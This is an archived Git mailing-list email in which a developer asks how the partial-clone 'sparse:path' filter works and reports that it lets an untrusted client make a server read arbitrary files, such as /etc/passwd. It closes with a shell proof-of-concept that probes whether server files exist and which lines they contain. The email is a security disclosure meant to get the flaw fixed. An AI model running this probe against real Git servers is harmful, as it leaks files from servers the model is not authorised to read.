Return-Path: <git-owner@vger.kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.1 (2015-04-28) on dcvr.yhbt.net
X-Spam-Level: 
X-Spam-ASN: AS31976 209.132.180.0/23
X-Spam-Status: No, score=-4.0 required=3.0 tests=AWL,BAYES_00,
	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI
	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.1
Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
	by dcvr.yhbt.net (Postfix) with ESMTP id C4B1D1F453
	for <e@80x24.org>; Thu,  8 Nov 2018 05:08:25 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1728801AbeKHOlh (ORCPT <rfc822;e@80x24.org>);
        Thu, 8 Nov 2018 09:41:37 -0500
Received: from cloud.peff.net ([104.130.231.41]:44544 "HELO cloud.peff.net"
        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with SMTP
        id S1728499AbeKHOlg (ORCPT <rfc822;git@vger.kernel.org>);
        Thu, 8 Nov 2018 09:41:36 -0500
Received: (qmail 31282 invoked by uid 109); 8 Nov 2018 05:07:58 -0000
Received: from Unknown (HELO peff.net) (10.0.1.2)
 by cloud.peff.net (qpsmtpd/0.94) with SMTP; Thu, 08 Nov 2018 05:07:58 +0000
Authentication-Results: cloud.peff.net; auth=none
Received: (qmail 25997 invoked by uid 111); 8 Nov 2018 05:07:16 -0000
Received: from sigill.intra.peff.net (HELO sigill.intra.peff.net) (10.0.0.7)
 by peff.net (qpsmtpd/0.94) with (ECDHE-RSA-AES256-GCM-SHA384 encrypted) SMTP; Thu, 08 Nov 2018 00:07:16 -0500
Authentication-Results: peff.net; auth=none
Received: by sigill.intra.peff.net (sSMTP sendmail emulation); Thu, 08 Nov 2018 00:07:55 -0500
Date:   Thu, 8 Nov 2018 00:07:55 -0500
From:   Jeff King <peff@peff.net>
To:     git@vger.kernel.org
Cc:     Jeff Hostetler <jeffhost@microsoft.com>,
        Jonathan Tan <jonathantanmy@google.com>,
        Matthew DeVore <matvore@google.com>
Subject: how does "clone --filter=sparse:path" work?
Message-ID: <20181108050755.GA32158@sigill.intra.peff.net>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Sender: git-owner@vger.kernel.org
Precedence: bulk
List-ID: <git.vger.kernel.org>
X-Mailing-List: git@vger.kernel.org

[cc-ing people who worked on or seem interested in partial-clone
filters]

I've been exploring the partial-clone options a bit, and took a look at
the "sparse:path" option. I had some confusion initially, because I
expected it work something like this:

  git clone --filter=sparse:path=Documentation .

But it really doesn't take an in-repo path. You have to specify a path
to a file that contains a file with .gitignore patterns. Except they're
actually _inverted_ patterns (i.e., what to include). Which confused me
again, but I guess makes sense if these are meant to be adapted from
sparse-checkout files.

So my first question is: how is this meant to be used?

I guess the idea is that somebody (the repo admin?) makes a set of
pre-made profiles, with each profile mentioning some subset of paths.
And then when you clone, you say, "I want the foo profile". How is that
profile stored and accessed?

If it's a blob in the repository, I think you can use something like
"--filter=sparse:oid=profiles:foo". And then after cloning, you'd
do "git cat-file blob profiles:foo >.git/sparse-checkout" or similar.
That seems like something that could be wrapped up in a single clone
option, but I can't find one; I won't be surprised if it simply hasn't
happened yet.

But if it's a path, then what? I'd imagine that you'd "somehow" get a
copy of the sparse profile you want out-of-band. And then you'd say "I
want to clone with the profile in this file", and then copy it into the
sparse-checkout file to do the checkout.

But the sparse-checkout file in the filter is not expanded locally, with
patterns sent over the wire. The _filename_ is sent over the wire, and
then upload-pack expands it. So you can't specify an arbitrary set of
patterns; you have to know about the profile names (how?) on the server.
That's not very flexible, though I imagine it may make certain things
easier on the server (e.g., if you pack in such a way to efficiently
serve only particular profiles).

But I'm also concerned it's dangerous. We're reading gitignore patterns
from an arbitrary name on the server's filesystem, with that name coming
from an untrusted client. So I can do:

  git clone --filter=sparse:path=/etc/passwd $remote

and the server will read /etc/passwd. There's probably a lot of mischief
you can get up to with that. Sadly reading /proc/self/mem doesn't work,
because the gitignore code fstat()s the file to find out how much to
read, and the st_size there is 0. But there are probably others
(/proc/kcore is a fun one, but nobody is running their git server as
root, right?).

Below is a proof of concept script that uses this as an oracle to
explore the filesystem, as well as individual lines of files.

Should we simply be disallowing sparse:path filters over upload-pack?

-Peff

-- >8 --
# Set this to host:repo.git to see a real cross-machine connection (which makes
# it more obvious which side is reading which files).  For a simulated local
# one, we'll use --no-local to make sure we really run upload-pack.
SERVER=server.git

# Do these steps manually on the remote side if you're trying it cross-server.
case "$SERVER" in
*:*)
	;;
*)
	# Imagine a server with a repository users can push to, with filters enabled.
	git init -q --bare $SERVER
	git -C $SERVER config uploadpack.allowfilter true

	# Imagine the server has a file outside of the repo we're interested in.
	echo foo >/tmp/secret
	;;
esac

# Some base setup.
git clone -q $SERVER local
git -C local commit -q --allow-empty -m 'some base commit'
git -C local push -q

# We can find out whether a path exists on the filesystem.
probe_file () {
	# The remote upload-pack will barf if it cannot read the path $1.
	rm -rf result
	if git clone --bare --no-local --filter=sparse:path=$1 \
		$SERVER result >/dev/null 2>&1
	then
		echo "$1 exists"
	else
		echo "$1 does not exist"
	fi
}
probe_file /tmp/missing
probe_file /tmp/secret

# We can also check individual lines in a file.
probe_line () {
	# Make a probe that contains the path $2.
	(
		cd local
		echo $2 >$2
		git add $2
		git commit -m "probe for $2"
		git push
	) >/dev/null 2>&1

	# And then fetch that probe with the filter to see
	# if it was included. This needs to be bare so we don't
	# do a followup fetch to checkout.
	rm -rf result
	git clone -q --bare --no-local --filter=sparse:path=$1 \
		$SERVER result

	# We have all the information we need now, but we have to convince Git
	# to tell it to us. There's no way to set fetch_if_missing externally,
	# but we can drop the remote, which means that excluded paths
	# will result in an error.
	git -C result remote rm origin
	if git -C result cat-file -t HEAD:$2 >/dev/null 2>&1
	then
		echo "$1 contains line $2"
	else
		echo "$1 does not contain line $2"
	fi
}
probe_line /tmp/secret foo
probe_line /tmp/secret bar
